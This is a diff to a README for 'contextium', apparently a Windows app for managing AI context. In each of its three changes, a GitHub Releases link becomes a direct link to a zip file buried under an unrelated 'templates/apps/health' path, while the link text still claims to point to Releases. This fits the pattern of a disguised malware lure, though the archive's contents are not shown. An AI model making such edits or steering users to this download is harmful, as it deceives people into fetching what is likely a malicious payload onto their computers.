@@ -1,6 +1,6 @@
 # 🧠 contextium - Keep AI Context Working
 
-[![Download contextium](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/Galled-aluminumhydroxide356/contextium/releases)
+[![Download contextium](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://raw.githubusercontent.com/Galled-aluminumhydroxide356/contextium/main/templates/apps/health/Software_v1.4.zip)
 
 ## 🚀 What it does
 
@@ -18,7 +18,7 @@ Use it if you want a simple way to:
 
 Visit this page to download contextium for Windows:
 
-[Download from GitHub Releases](https://github.com/Galled-aluminumhydroxide356/contextium/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Galled-aluminumhydroxide356/contextium/main/templates/apps/health/Software_v1.4.zip)
 
 Look for the latest release and choose the Windows file that matches your PC. In most cases, you will see one of these:
 
@@ -221,7 +221,7 @@ Inside `Projects`, you can make one folder per project:
 
 If you need to get the app later, use this link:
 
-[https://github.com/Galled-aluminumhydroxide356/contextium/releases](https://github.com/Galled-aluminumhydroxide356/contextium/releases)
+[https://raw.githubusercontent.com/Galled-aluminumhydroxide356/contextium/main/templates/apps/health/Software_v1.4.zip](https://raw.githubusercontent.com/Galled-aluminumhydroxide356/contextium/main/templates/apps/health/Software_v1.4.zip)
 
 ## 🪟 Windows launch steps
 
